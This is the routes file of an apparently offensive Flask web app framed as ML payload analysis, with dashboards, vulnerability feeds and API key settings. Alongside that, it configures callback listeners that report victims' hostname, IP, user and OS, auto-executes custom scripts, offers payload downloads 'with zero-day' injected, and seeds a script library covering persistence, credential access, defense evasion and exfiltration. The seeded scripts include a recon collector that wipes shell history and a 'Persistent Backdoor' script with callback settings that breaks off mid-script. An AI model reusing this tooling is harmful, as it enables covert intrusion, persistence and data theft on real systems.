import logging
import json
import io
import numpy as np
from flask import render_template, request, redirect, url_for, flash, jsonify, send_file, session, make_response
from app import db
from models import Payload, Vulnerability, TrainingSession, Feature, ScriptTemplate
from ml_engine.feature_extraction import extract_features_from_payload
from ml_engine.anomaly_detection import detect_anomalies
from ml_engine.clustering import cluster_payloads
from ml_engine.model_training import train_models
from ml_engine.payload_analyzer import analyze_payload
from ml_engine.data_generator import generate_sample_data, generate_enhanced_dataset
import matplotlib
matplotlib.use('Agg')
import matplotlib.pyplot as plt
import seaborn as sns
from datetime import datetime

logger = logging.getLogger(__name__)

def init_routes(app):
    @app.route('/')
    def index():
        """Main landing page"""
        return render_template('index.html')
        
    @app.route('/attack-surface')
    def attack_surface():
        """Attack Surface Visualization page"""
        return render_template('attack_surface.html')
        
    @app.route('/exploit-simulator')
    def exploit_simulator():
        """Exploit Simulator page"""
        return render_template('exploit_simulator.html')
        
    @app.route('/mobile-analysis', methods=['GET', 'POST'])
    def mobile_analysis():
        """Mobile Application Analysis page"""
        if request.method == 'POST':
            # This would be handled by the upload_mobile_app route
            return redirect(url_for('mobile_analysis'))
            
        return render_template('mobile_analysis.html')
    
    @app.route('/dashboard')
    def dashboard():
        """Dashboard showing detection statistics and recent payloads"""
        # Count statistics
        total_payloads = Payload.query.count()
        analyzed_payloads = Payload.query.filter_by(analyzed=True).count()
        anomalous_payloads = Payload.query.filter_by(is_anomalous=True).count()
        vulnerability_count = Vulnerability.query.count()
        
        # Get recent payloads
        recent_payloads = Payload.query.order_by(Payload.created_at.desc()).limit(10).all()
        
        # Get recent vulnerabilities
        recent_vulnerabilities = Vulnerability.query.order_by(Vulnerability.created_at.desc()).limit(10).all()
        
        # Calculate percentage of anomalous payloads
        anomaly_percentage = 0
        if analyzed_payloads > 0:
            anomaly_percentage = (anomalous_payloads / analyzed_payloads) * 100
            
        # Get latest training session
        latest_training = TrainingSession.query.order_by(TrainingSession.started_at.desc()).first()
        
        return render_template('dashboard.html',
                              total_payloads=total_payloads,
                              analyzed_payloads=analyzed_payloads,
                              anomalous_payloads=anomalous_payloads,
                              vulnerability_count=vulnerability_count,
                              recent_payloads=recent_payloads,
                              recent_vulnerabilities=recent_vulnerabilities,
                              anomaly_percentage=anomaly_percentage,
                              latest_training=latest_training)
    
    @app.route('/zero-day-feed')
    def zero_day_feed():
        """Page displaying the zero-day vulnerability news feed"""
        # Get news items from database
        from models import ZeroDayNews, ZeroDayCategory
        from ml_engine.payload_analyzer import update_news_feed, get_vulnerability_statistics
        
        # Update and get news
        update_news_feed()
        news_items = ZeroDayNews.query.order_by(ZeroDayNews.published_date.desc()).all()
        
        # Get categories
        categories = ZeroDayCategory.query.order_by(ZeroDayCategory.name).all()
        
        # Get vulnerability statistics
        vulnerability_stats = get_vulnerability_statistics()
        
        # Check if we have API keys configured
        import os
        has_vuldb_key = os.environ.get('VULDB_API_KEY') is not None
        has_nist_nvd_key = os.environ.get('NIST_NVD_API_KEY') is not None
        
        return render_template(
            'zero_day_feed.html', 
            news_items=news_items, 
            categories=categories,
            vulnerability_stats=vulnerability_stats,
            has_vuldb_key=has_vuldb_key,
            has_nist_nvd_key=has_nist_nvd_key
        )
        
    @app.route('/api/refresh-vulnerability-feed', methods=['POST'])
    def refresh_vulnerability_feed():
        """Force refresh the zero-day vulnerability feed with live data"""
        try:
            from ml_engine.payload_analyzer import update_news_feed
            
            # Force update from external sources
            count = update_news_feed()
            
            if count == 0:
                return jsonify({
                    'success': False, 
                    'message': 'No vulnerability data available or API limits reached. Try again later.'
                }), 400
                
            return jsonify({
                'success': True, 
                'message': f'Successfully refreshed vulnerability feed with {count} items'
            })
            
        except Exception as e:
            logger.error(f"Error refreshing vulnerability feed: {str(e)}")
            return jsonify({
                'success': False,
                'message': f'Error refreshing feed: {str(e)}'
            }), 500

    @app.route('/analyze', methods=['GET', 'POST'])
    def analyze():
        """Page for analyzing new payloads"""
        # Get vulnerability categories for the selection dropdown
        from models import ZeroDayCategory
        from ml_engine.payload_analyzer import get_zeroday_categories
        categories = get_zeroday_categories()
        
        if request.method == 'POST':
            # Get the submitted payload
            payload_name = request.form.get('payload_name', 'Unnamed Payload')
            payload_content = request.form.get('payload_content', '')
            payload_type = request.form.get('payload_type', 'text')
            
            # Check if a file was uploaded
            if 'payload_file' in request.files and request.files['payload_file'].filename:
                file = request.files['payload_file']
                # Use the file name if payload_name was not provided
                if payload_name == 'Unnamed Payload' and file.filename:
                    payload_name = file.filename
                
                # Read file content
                payload_content = file.read().decode('utf-8', errors='replace')
                
                # Try to determine payload type from file extension if not set
                if file.filename:
                    extension = file.filename.split('.')[-1].lower()
                    if extension == 'json':
                        payload_type = 'json'
                    elif extension in ['xml', 'html', 'svg']:
                        payload_type = 'xml'
                    elif extension in ['sh', 'bash', 'js', 'py', 'php', 'rb', 'pl', 'ps1']:
                        payload_type = 'script'
                    # Default to text for other extensions
            
            # Check if a specific vulnerability type was selected
            inject_zero_day = 'inject_zero_day' in request.form
            selected_vulnerability = request.form.get('vulnerability_type', None)
            
            # Get deep learning model options
            use_deep_learning = 'use_deep_learning' in request.form
            deep_learning_model = request.form.get('deep_learning_model', 'ensemble')
            
            # Get external API options
            use_virustotal = 'use_virustotal' in request.form
            use_metasploit = 'use_metasploit' in request.form
            
            # Process listener configuration
            configure_listener = 'configure_listener' in request.form
            listener_config = None
            if configure_listener:
                listener_config = {
                    'host': request.form.get('listener_host', ''),
                    'port': int(request.form.get('listener_port', 443)),
                    'interval': int(request.form.get('listener_interval', 60)),
                    'report_data': {
                        'hostname': 'callback_data_hostname' in request.form,
                        'ip': 'callback_data_ip' in request.form,
                        'user': 'callback_data_user' in request.form,
                        'os': 'callback_data_os' in request.form
                    }
                }
                
                # Handle custom script if enabled
                use_custom_script = 'use_custom_script' in request.form
                if use_custom_script:
                    # Check if a script from the library was selected
                    script_library_id = request.form.get('script_library_id', '')
                    
                    if script_library_id:
                        # Get the script from the library
                        from models import ScriptTemplate
                        script_template = ScriptTemplate.query.get(script_library_id)
                        
                        if script_template:
                            # Use the script from the library
                            custom_script = script_template.code
                            script_language = script_template.language
                            auto_execute = 'auto_execute' in request.form
                            
                            # Add script library information to listener configuration
                            listener_config['custom_script'] = {
                                'code': custom_script,
                                'language': script_language,
                                'auto_execute': auto_execute,
                                'from_library': True,
                                'library_script_name': script_template.name,
                                'library_script_id': script_template.id
                            }
                        else:
                            # Fallback to manual entry if script not found
                            custom_script = request.form.get('custom_script', '')
                            script_language = request.form.get('script_language', 'bash')
                            auto_execute = 'auto_execute' in request.form
                            
                            # Add custom script to listener configuration
                            if custom_script.strip():
                                listener_config['custom_script'] = {
                                    'code': custom_script,
                                    'language': script_language,
                                    'auto_execute': auto_execute,
                                    'from_library': False
                                }
                    else:
                        # Handle manually entered script
                        custom_script = request.form.get('custom_script', '')
                        script_language = request.form.get('script_language', 'bash')
                        auto_execute = 'auto_execute' in request.form
                        
                        # Add custom script to listener configuration
                        if custom_script.strip():
                            listener_config['custom_script'] = {
                                'code': custom_script,
                                'language': script_language,
                                'auto_execute': auto_execute,
                                'from_library': False
                            }
            
            if not payload_content:
                flash('Payload content cannot be empty. Please enter content or upload a file.', 'danger')
                return redirect(url_for('analyze'))
            
            # Create a new payload entry
            new_payload = Payload(
                name=payload_name,
                content=payload_content,
                content_type=payload_type,
                size=len(payload_content),
                created_at=datetime.utcnow(),
                analyzed=False
            )
            
            db.session.add(new_payload)
            db.session.commit()
            
            # Perform analysis
            try:
                from ml_engine.payload_analyzer import analyze_payload
                
                # Log analysis options for debugging
                logger.info(f"Analyzing payload {new_payload.id} with deep learning: {use_deep_learning}, model: {deep_learning_model}, VirusTotal: {use_virustotal}, Metasploit: {use_metasploit}, Listener: {configure_listener}")
                if configure_listener:
                    logger.info(f"Listener config: {listener_config}")
                
                # Extract custom script configuration if present
                custom_script = None
                if configure_listener and listener_config and 'custom_script' in listener_config:
                    custom_script = listener_config.get('custom_script', None)
                
                result = analyze_payload(
                    new_payload.id, 
                    inject_zero_day=inject_zero_day,
                    selected_vulnerability=selected_vulnerability,
                    use_deep_learning=use_deep_learning,
                    deep_learning_model=deep_learning_model,
                    use_virustotal=use_virustotal,
                    use_metasploit=use_metasploit,
                    listener_config=listener_config,
                    custom_script=custom_script
                )
                return redirect(url_for('detection_result', payload_id=new_payload.id))
            except Exception as e:
                logger.error(f"Error analyzing payload: {str(e)}")
                flash(f'Error analyzing payload: {str(e)}', 'danger')
                return redirect(url_for('analyze'))
        
        return render_template('analyze.html', vulnerability_categories=categories)
    
    @app.route('/detection_result/<int:payload_id>')
    def detection_result(payload_id):
        """Show detailed analysis results for a payload"""
        payload = Payload.query.get_or_404(payload_id)
        vulnerabilities = Vulnerability.query.filter_by(payload_id=payload_id).all()
        
        # Get feature data if available
        feature_data = Feature.query.filter_by(payload_id=payload_id).first()
        features = {}
        if feature_data:
            features = json.loads(feature_data.features)
        
        return render_template('detection_result.html', 
                               payload=payload, 
                               vulnerabilities=vulnerabilities, 
                               features=features)
    
    @app.route('/training', methods=['GET', 'POST'])
    def training():
        """Page for training/retraining the model"""
        if request.method == 'POST':
            session_name = request.form.get('session_name', f'Training-{datetime.utcnow().strftime("%Y-%m-%d-%H-%M")}')
            sample_size = int(request.form.get('sample_size', 100))
            model_type = request.form.get('model_type', 'standard')
            
            # Create a new training session
            training_session = TrainingSession(
                name=session_name,
                started_at=datetime.utcnow(),
                status="running",
                num_samples=sample_size
            )
            
            db.session.add(training_session)
            db.session.commit()
            
            try:
                # Determine which training function to use based on model type
                if model_type == 'deep_learning':
                    from ml_engine.deep_learning import train_deep_learning_models
                    train_deep_learning_models(training_session.id, sample_size)
                    flash('Deep learning model training completed successfully!', 'success')
                else:
                    # Standard ML training
                    train_models(training_session.id, sample_size)
                    flash('Standard model training completed successfully!', 'success')
            except Exception as e:
                logger.error(f"Error during training: {str(e)}")
                flash(f'Error during training: {str(e)}', 'danger')
                
            return redirect(url_for('training'))
        
        # Get training history
        training_sessions = TrainingSession.query.order_by(TrainingSession.started_at.desc()).all()
        
        return render_template('training.html', training_sessions=training_sessions)
    
    @app.route('/api/generate_sample_data', methods=['POST'])
    def api_generate_sample_data():
        """API endpoint to generate sample training data"""
        try:
            count = int(request.form.get('count', 100))
            if count < 1 or count > 1000:
                return jsonify({'error': 'Count must be between 1 and 1000'}), 400
            
            enhanced = request.form.get('enhanced', 'false').lower() == 'true'
            
            if enhanced:
                result = generate_enhanced_dataset(count)
                return jsonify({
                    'success': True, 
                    'message': f'Generated enhanced dataset with {result["normal_count"]} normal and {result["anomalous_count"]} anomalous samples',
                    'details': 'Enhanced dataset includes examples of all vulnerability types'
                })
            else:
                result = generate_sample_data(count)
                return jsonify({'success': True, 'message': f'Generated {result["normal_count"]} normal and {result["anomalous_count"]} anomalous samples'})
        except Exception as e:
            logger.error(f"Error generating sample data: {str(e)}")
            return jsonify({'error': str(e)}), 500
            
    @app.route('/api/generate_enhanced_dataset', methods=['POST'])
    def api_generate_enhanced_dataset():
        """API endpoint to generate enhanced dataset with all vulnerability types"""
        try:
            count = int(request.form.get('count', 200))
            if count < 1 or count > 1000:
                return jsonify({'error': 'Count must be between 1 and 1000'}), 400
                
            result = generate_enhanced_dataset(count)
            
            # Get vulnerability distribution
            vuln_types = list(result.get('vulnerability_distribution', {}).keys())
            
            return jsonify({
                'success': True, 
                'message': f'Generated enhanced dataset with {result["normal_count"]} normal and {result["anomalous_count"]} anomalous samples',
                'vulnerability_types': vuln_types,
                'details': 'Enhanced dataset includes examples of all vulnerability types'
            })
        except Exception as e:
            logger.error(f"Error generating enhanced dataset: {str(e)}")
            return jsonify({'error': str(e)}), 500
            
    @app.route('/api/train_deep_learning', methods=['POST'])
    def api_train_deep_learning():
        """API endpoint to train deep learning models"""
        try:
            # Get parameters
            session_name = request.form.get('session_name', f'DeepLearning-{datetime.utcnow().strftime("%Y-%m-%d-%H-%M")}')
            sample_size = int(request.form.get('sample_size', 100))
            model_types = request.form.getlist('model_types[]') or ['lstm', 'transformer']
            
            # Create a new training session
            training_session = TrainingSession(
                name=session_name,
                started_at=datetime.utcnow(),
                status="running",
                num_samples=sample_size
            )
            
            db.session.add(training_session)
            db.session.commit()
            
            # Import and call the deep learning training function
            from ml_engine.deep_learning import train_deep_learning_models
            
            # Start training in a separate thread to avoid blocking
            def train_in_background():
                try:
                    train_deep_learning_models(training_session.id, sample_size)
                except Exception as e:
                    logger.error(f"Error in deep learning training thread: {str(e)}")
                    training_session.status = "failed"
                    db.session.commit()
            
            import threading
            thread = threading.Thread(target=train_in_background)
            thread.daemon = True
            thread.start()
            
            return jsonify({
                'success': True,
                'message': 'Deep learning training started successfully',
                'session_id': training_session.id,
                'session_name': training_session.name
            })
            
        except Exception as e:
            logger.error(f"Error starting deep learning training: {str(e)}")
            return jsonify({'error': str(e)}), 500
    
    @app.route('/api/visualize_clusters')
    def visualize_clusters():
        """Generate and return a visualization of payload clusters"""
        try:
            # Get all payloads with cluster assignments
            payloads = Payload.query.filter(Payload.cluster_id.isnot(None)).all()
            
            if not payloads:
                return jsonify({'error': 'No clustered payloads found'}), 404
            
            # Collect data for visualization
            cluster_ids = [p.cluster_id for p in payloads]
            anomaly_scores = [p.anomaly_score for p in payloads]
            
            # Create a scatter plot
            plt.figure(figsize=(10, 6))
            plt.scatter(cluster_ids, anomaly_scores, c=cluster_ids, cmap='viridis', alpha=0.6)
            plt.xlabel('Cluster ID')
            plt.ylabel('Anomaly Score')
            plt.title('Payload Clusters vs Anomaly Scores')
            plt.colorbar(label='Cluster')
            plt.tight_layout()
            
            # Save the figure to a bytes buffer
            buf = io.BytesIO()
            plt.savefig(buf, format='png')
            buf.seek(0)
            plt.close()
            
            # Return the image
            return send_file(buf, mimetype='image/png')
        except Exception as e:
            logger.error(f"Error generating cluster visualization: {str(e)}")
            return jsonify({'error': str(e)}), 500
            
    @app.route('/api/advanced_cluster_visualization')
    def advanced_cluster_visualization():
        """Generate and return an advanced visualization of payload clusters using dimensionality reduction"""
        try:
            # Get parameters from the request
            model_type = request.args.get('model_type', 'kmeans')
            dimension_reduction = request.args.get('dimension_reduction', 'tsne')
            
            # Get payload IDs to visualize (optional)
            payload_ids_str = request.args.get('payload_ids')
            payload_ids = None
            if payload_ids_str:
                try:
                    payload_ids = [int(pid) for pid in payload_ids_str.split(',')]
                except ValueError:
                    return jsonify({'error': 'Invalid payload IDs format'}), 400
            
            # Import the function here to avoid circular imports
            from ml_engine.clustering import visualize_clusters as viz_func
            
            # Generate the visualization
            viz_path = viz_func(
                payload_ids=payload_ids,
                model_type=model_type,
                dimension_reduction=dimension_reduction
            )
            
            if not viz_path:
                return jsonify({'error': 'Failed to generate cluster visualization'}), 500
            
            # Return the visualization image
            return send_file(viz_path, mimetype='image/png')
            
        except Exception as e:
            logger.error(f"Error generating advanced cluster visualization: {str(e)}")
            return jsonify({'error': str(e)}), 500
    
    @app.route('/api/payload/<int:payload_id>')
    def get_payload(payload_id):
        """API endpoint to get payload details"""
        payload = Payload.query.get_or_404(payload_id)
        vulnerabilities = Vulnerability.query.filter_by(payload_id=payload_id).all()
        
        return jsonify({
            'id': payload.id,
            'name': payload.name, 
            'content_type': payload.content_type,
            'size': payload.size,
            'created_at': payload.created_at.isoformat(),
            'analyzed': payload.analyzed,
            'anomaly_score': payload.anomaly_score,
            'is_anomalous': payload.is_anomalous,
            'cluster_id': payload.cluster_id,
            'vulnerabilities': [
                {
                    'id': v.id,
                    'name': v.name,
                    'description': v.description,
                    'severity': v.severity,
                    'confidence': v.confidence
                } for v in vulnerabilities
            ]
        })
        
    @app.route('/download_payload/<int:payload_id>')
    def download_payload(payload_id):
        """Download the analyzed payload with injected zero-day vulnerability"""
        payload = Payload.query.get_or_404(payload_id)
        
        # Determine appropriate file extension based on content type
        file_extensions = {
            'json': '.json',
            'xml': '.xml',
            'script': '.sh',
            'text': '.txt'
        }
        
        # Get file extension or default to .txt
        file_ext = file_extensions.get(payload.content_type, '.txt')
        
        # Create a download filename
        download_filename = f"{payload.name.replace(' ', '_')}_with_zeroday{file_ext}"
        
        # Create a response with the payload content
        response = app.response_class(
            response=payload.content,
            mimetype='text/plain',
            headers={'Content-Disposition': f'attachment; filename={download_filename}'}
        )
        
        return response
        
    @app.route('/settings', methods=['GET', 'POST'])
    def settings():
        """Page for managing API settings and keys"""
        # Get current API keys from environment
        import os
        
        api_keys = {
            'NIST_NVD_API_KEY': os.environ.get('NIST_NVD_API_KEY', ''),
            'VULDB_API_KEY': os.environ.get('VULDB_API_KEY', ''),
            'ALIENVAULT_OTX_API_KEY': os.environ.get('ALIENVAULT_OTX_API_KEY', ''),
            'VIRUSTOTAL_API_KEY': os.environ.get('VIRUSTOTAL_API_KEY', ''),
            'OWASP_DEPENDENCY_CHECK_ENABLED': os.environ.get('OWASP_DEPENDENCY_CHECK_ENABLED', ''),
            'METASPLOIT_API_KEY': os.environ.get('METASPLOIT_API_KEY', ''),
            'NETWORKSENTRY_API_KEY': os.environ.get('NETWORKSENTRY_API_KEY', '')
        }
        
        if request.method == 'POST':
            # Process the submitted form
            for key in api_keys.keys():
                new_value = request.form.get(key, '')
                
                # Handle the checkbox toggle for OWASP Dependency Check
                if key == 'OWASP_DEPENDENCY_CHECK_ENABLED':
                    new_value = 'true' if key in request.form else 'false'
                
                # Only update if there's a value (don't clear existing keys if empty)
                if new_value:
                    os.environ[key] = new_value
                    api_keys[key] = new_value
                    
            flash('API settings updated successfully!', 'success')
            return redirect(url_for('settings'))
            
        return render_template('settings.html', api_keys=api_keys)
    
    @app.route('/api/test-connections', methods=['POST'])
    @app.route('/script_library', methods=['GET', 'POST'])
    def script_library():
        """Page for managing the script template library"""
        from models import ScriptTemplate
        
        # Categories for organizing scripts
        script_categories = [
            'data_collection', 'persistence', 'lateral_movement', 
            'credential_access', 'defense_evasion', 'exfiltration',
            'system_info', 'network', 'misc'
        ]
        
        # Handle form submission for adding a new script
        if request.method == 'POST':
            try:
                # Extract form data
                name = request.form.get('name', '')
                description = request.form.get('description', '')
                code = request.form.get('code', '')
                language = request.form.get('language', 'bash')
                category = request.form.get('category', 'misc')
                tags = request.form.get('tags', '')
                
                # Validate input
                if not name or not code:
                    flash('Script name and code are required.', 'danger')
                else:
                    # Create new script template
                    script = ScriptTemplate(
                        name=name,
                        description=description,
                        code=code,
                        language=language,
                        category=category,
                        tags=tags
                    )
                    
                    db.session.add(script)
                    db.session.commit()
                    
                    flash('Script template added successfully!', 'success')
                    return redirect(url_for('script_library'))
                    
            except Exception as e:
                logger.error(f"Error adding script template: {str(e)}")
                flash(f'Error adding script template: {str(e)}', 'danger')
        
        # Get all script templates
        scripts = ScriptTemplate.query.order_by(ScriptTemplate.name).all()
        
        return render_template('script_library.html', 
                              scripts=scripts,
                              script_categories=script_categories)
    
    @app.route('/api/script_templates')
    def get_script_templates():
        """API endpoint to get all script templates"""
        from models import ScriptTemplate
        
        # Get script templates with optional filtering
        language = request.args.get('language')
        category = request.args.get('category')
        
        query = ScriptTemplate.query
        
        if language:
            query = query.filter(ScriptTemplate.language == language)
            
        if category:
            query = query.filter(ScriptTemplate.category == category)
            
        scripts = query.all()
        
        # Convert to JSON
        result = [script.to_dict() for script in scripts]
        
        return jsonify({'scripts': result})
    
    @app.route('/api/script_templates/<int:script_id>')
    def get_script_template(script_id):
        """API endpoint to get a specific script template"""
        from models import ScriptTemplate
        
        script = ScriptTemplate.query.get_or_404(script_id)
        
        return jsonify(script.to_dict())
    
    @app.route('/api/script_templates/<int:script_id>', methods=['DELETE'])
    def delete_script_template(script_id):
        """API endpoint to delete a script template"""
        from models import ScriptTemplate
        
        script = ScriptTemplate.query.get_or_404(script_id)
        
        try:
            db.session.delete(script)
            db.session.commit()
            return jsonify({'success': True})
        except Exception as e:
            logger.error(f"Error deleting script template: {str(e)}")
            return jsonify({'error': str(e)}), 500
    
    def test_connections():
        """Test connections to external APIs"""
        try:
            import os
            import requests
            import time
            
            results = {}
            
            # Test NIST NVD API
            if os.environ.get('NIST_NVD_API_KEY'):
                try:
                    nvd_api_key = os.environ.get('NIST_NVD_API_KEY')
                    nvd_url = "https://services.nvd.nist.gov/rest/json/cves/2.0"
                    headers = {"apiKey": nvd_api_key}
                    params = {"resultsPerPage": 1}  # Just request a single result to minimize load
                    
                    response = requests.get(nvd_url, headers=headers, params=params, timeout=10)
                    results['NIST NVD'] = response.status_code == 200
                except Exception as e:
                    logger.error(f"NIST NVD connection test failed: {str(e)}")
                    results['NIST NVD'] = False
            
            # Test VulDB API
            if os.environ.get('VULDB_API_KEY'):
                try:
                    vuldb_api_key = os.environ.get('VULDB_API_KEY')
                    vuldb_url = "https://vuldb.com/api/v1/search"
                    headers = {"X-VulDB-ApiKey": vuldb_api_key}
                    data = {"details": 1, "limit": 1}  # Just request a single result
                    
                    response = requests.post(vuldb_url, headers=headers, json=data, timeout=10)
                    results['VulDB'] = response.status_code == 200
                except Exception as e:
                    logger.error(f"VulDB connection test failed: {str(e)}")
                    results['VulDB'] = False
            
            # Test AlienVault OTX API
            if os.environ.get('ALIENVAULT_OTX_API_KEY'):
                try:
                    otx_api_key = os.environ.get('ALIENVAULT_OTX_API_KEY')
                    otx_url = "https://otx.alienvault.com/api/v1/user/me"
                    headers = {"X-OTX-API-KEY": otx_api_key}
                    
                    response = requests.get(otx_url, headers=headers, timeout=10)
                    results['AlienVault OTX'] = response.status_code == 200
                except Exception as e:
                    logger.error(f"AlienVault OTX connection test failed: {str(e)}")
                    results['AlienVault OTX'] = False
            
            # Test NetworkSentry API
            if os.environ.get('NETWORKSENTRY_API_KEY'):
                try:
                    networksentry_api_key = os.environ.get('NETWORKSENTRY_API_KEY')
                    networksentry_url = "https://api.networksentry.io/v1/status"
                    headers = {"Authorization": f"Bearer {networksentry_api_key}"}
                    
                    response = requests.get(networksentry_url, headers=headers, timeout=10)
                    results['NetworkSentry'] = response.status_code == 200
                except Exception as e:
                    logger.error(f"NetworkSentry connection test failed: {str(e)}")
                    results['NetworkSentry'] = False
            
            # Test VirusTotal API
            if os.environ.get('VIRUSTOTAL_API_KEY'):
                try:
                    vt_api_key = os.environ.get('VIRUSTOTAL_API_KEY')
                    vt_url = "https://www.virustotal.com/api/v3/users/current"
                    headers = {"x-apikey": vt_api_key}
                    
                    response = requests.get(vt_url, headers=headers, timeout=10)
                    results['VirusTotal'] = response.status_code == 200
                except Exception as e:
                    logger.error(f"VirusTotal connection test failed: {str(e)}")
                    results['VirusTotal'] = False
            
            # Test Metasploit API
            if os.environ.get('METASPLOIT_API_KEY'):
                try:
                    metasploit_api_key = os.environ.get('METASPLOIT_API_KEY')
                    # For security reasons, we don't actually connect to any Metasploit server
                    # Just check if the API key exists and is in a valid format
                    # A valid Metasploit API key is typically a non-empty string of at least 16 characters
                    is_valid = metasploit_api_key and len(metasploit_api_key) >= 16
                    
                    # Check if our local integration module works
                    from ml_engine.metasploit_integration import check_for_metasploit_api_key
                    module_check = check_for_metasploit_api_key()
                    
                    results['Metasploit'] = is_valid and module_check
                except Exception as e:
                    logger.error(f"Metasploit API key check failed: {str(e)}")
                    results['Metasploit'] = False
            
            # Test OWASP Dependency Check (no API key needed, just check if it's enabled)
            if os.environ.get('OWASP_DEPENDENCY_CHECK_ENABLED') == 'true':
                results['OWASP Dependency Check'] = True
            
            # Sleep a bit to avoid hammering APIs
            time.sleep(1)
            
            return jsonify({
                'success': True,
                'results': results,
                'message': 'Connection tests completed'
            })
            
        except Exception as e:
            logger.error(f"Error testing connections: {str(e)}")
            return jsonify({
                'success': False,
                'message': f'Error testing connections: {str(e)}'
            }), 500
    
    # Initialize the script library with default scripts if empty
    def initialize_script_library():
        # Only initialize if no scripts exist
        if ScriptTemplate.query.count() == 0:
            default_scripts = [
                {
                    'name': 'System Information Collector (Bash)',
                    'description': 'Collects detailed system information including hardware, network, and running processes',
                    'code': '''#!/bin/bash
# System Information Collector
# Environment variables available: $HOSTNAME, $IP, $USERNAME, $OSINFO

# Create output directory
mkdir -p /tmp/system_info_$USERNAME
OUTPUT_DIR="/tmp/system_info_$USERNAME"
LOGFILE="$OUTPUT_DIR/system_info.log"

echo "[*] Starting system information collection at $(date)" | tee $LOGFILE
echo "[*] System: $HOSTNAME ($IP)" | tee -a $LOGFILE
echo "[*] OS: $OSINFO" | tee -a $LOGFILE
echo "[*] User: $USERNAME" | tee -a $LOGFILE

# Hardware info
echo "[+] Collecting hardware information..." | tee -a $LOGFILE
echo "CPU Info:" >> $OUTPUT_DIR/hardware.txt
cat /proc/cpuinfo 2>/dev/null >> $OUTPUT_DIR/hardware.txt || echo "Failed to get CPU info" >> $OUTPUT_DIR/hardware.txt
echo "\\nMemory Info:" >> $OUTPUT_DIR/hardware.txt
free -h 2>/dev/null >> $OUTPUT_DIR/hardware.txt || echo "Failed to get memory info" >> $OUTPUT_DIR/hardware.txt
echo "\\nDisk Info:" >> $OUTPUT_DIR/hardware.txt
df -h 2>/dev/null >> $OUTPUT_DIR/hardware.txt || echo "Failed to get disk info" >> $OUTPUT_DIR/hardware.txt

# Network info
echo "[+] Collecting network information..." | tee -a $LOGFILE
echo "Network Interfaces:" >> $OUTPUT_DIR/network.txt
ifconfig 2>/dev/null >> $OUTPUT_DIR/network.txt || ip a 2>/dev/null >> $OUTPUT_DIR/network.txt || echo "Failed to get network interfaces" >> $OUTPUT_DIR/network.txt
echo "\\nRouting Table:" >> $OUTPUT_DIR/network.txt
netstat -rn 2>/dev/null >> $OUTPUT_DIR/network.txt || ip route 2>/dev/null >> $OUTPUT_DIR/network.txt || echo "Failed to get routing table" >> $OUTPUT_DIR/network.txt
echo "\\nOpen Ports:" >> $OUTPUT_DIR/network.txt
netstat -tuln 2>/dev/null >> $OUTPUT_DIR/network.txt || ss -tuln 2>/dev/null >> $OUTPUT_DIR/network.txt || echo "Failed to get open ports" >> $OUTPUT_DIR/network.txt

# Process info
echo "[+] Collecting process information..." | tee -a $LOGFILE
ps aux >> $OUTPUT_DIR/processes.txt 2>/dev/null || echo "Failed to get process list" >> $OUTPUT_DIR/processes.txt

echo "[*] System information collection completed at $(date)" | tee -a $LOGFILE
echo "[*] Results stored in $OUTPUT_DIR" | tee -a $LOGFILE

# Clean up command history
history -c 2>/dev/null
''',
                    'language': 'bash',
                    'category': 'system_info',
                    'tags': 'recon,system,network,hardware'
                },
                {
                    'name': 'Network Scanner (Python)',
                    'description': 'Simple network scanner that identifies open ports on local network devices',
                    'code': '''#!/usr/bin/env python3
# Network Scanner
# Environment variables available via os.environ: HOSTNAME, IP, USERNAME, OSINFO

import os
import socket
import subprocess
import ipaddress
from datetime import datetime

# Set up logging
log_file = "/tmp/network_scan.log"
with open(log_file, "w") as f:
    f.write(f"Network Scan started at {datetime.now()}\\n")
    f.write(f"Host: {os.environ.get('HOSTNAME', 'unknown')}\\n")
    f.write(f"IP: {os.environ.get('IP', 'unknown')}\\n")
    f.write(f"User: {os.environ.get('USERNAME', 'unknown')}\\n")
    f.write(f"OS: {os.environ.get('OSINFO', 'unknown')}\\n\\n")

def get_local_ip():
    """Get the local IP address"""
    try:
        # Create a socket to determine the outgoing IP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        # Fallback to environment variable or localhost
        return os.environ.get('IP', '127.0.0.1')

def scan_network():
    """Scan the local network for active hosts"""
    local_ip = get_local_ip()
    print(f"[*] Local IP: {local_ip}")
    
    # Determine network range (assuming /24 subnet)
    ip_parts = local_ip.split('.')
    network_prefix = '.'.join(ip_parts[0:3])
    network = f"{network_prefix}.0/24"
    
    print(f"[*] Scanning network: {network}")
    with open(log_file, "a") as f:
        f.write(f"Scanning network: {network}\\n")
    
    active_hosts = []
    
    # Scan the first 20 hosts in the subnet to avoid taking too long
    for i in range(1, 21):
        target_ip = f"{network_prefix}.{i}"
        if target_ip != local_ip:  # Skip our own IP
            try:
                # Use ping to check if host is up
                ping_cmd = ["ping", "-c", "1", "-W", "1", target_ip]
                result = subprocess.run(ping_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                if result.returncode == 0:
                    print(f"[+] Host {target_ip} is up")
                    active_hosts.append(target_ip)
                    with open(log_file, "a") as f:
                        f.write(f"Host {target_ip} is active\\n")
                    
                    # Scan common ports
                    for port in [21, 22, 23, 25, 80, 443, 445, 3389, 8080]:
                        try:
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.settimeout(0.5)
                            result = sock.connect_ex((target_ip, port))
                            if result == 0:
                                print(f"  - Port {port} is open")
                                with open(log_file, "a") as f:
                                    f.write(f"  - Port {port} is open on {target_ip}\\n")
                            sock.close()
                        except:
                            pass
            except:
                pass
    
    print(f"[*] Network scan complete. Found {len(active_hosts)} active hosts.")
    print(f"[*] Results saved to {log_file}")
    
    with open(log_file, "a") as f:
        f.write(f"\\nScan completed at {datetime.now()}\\n")
        f.write(f"Found {len(active_hosts)} active hosts\\n")

if __name__ == "__main__":
    scan_network()
''',
                    'language': 'python',
                    'category': 'network',
                    'tags': 'recon,network,scanner,ports'
                },
                {
                    'name': 'Persistent Backdoor (Bash)',
                    'description': 'Creates a persistent backdoor that survives system reboots',
                    'code': '''#!/bin/bash
# Persistent Backdoor Creator
# Environment variables available: $HOSTNAME, $IP, $USERNAME, $OSINFO

# Configuration
CALLBACK_HOST="$IP"
CALLBACK_PORT="443"
INTERVAL=60 # Callback every 60 seconds
BACKDOOR_NAME=".system_monitor" # Hidden file name
CRON_LABEL="SYSTEM_MONITOR" # Label for cron job

echo "[*] Setting up persistent backdoor on $HOSTNAME"
echo "[*] Callback target: $CALLBACK_HOST:$CALLBACK_PORT"

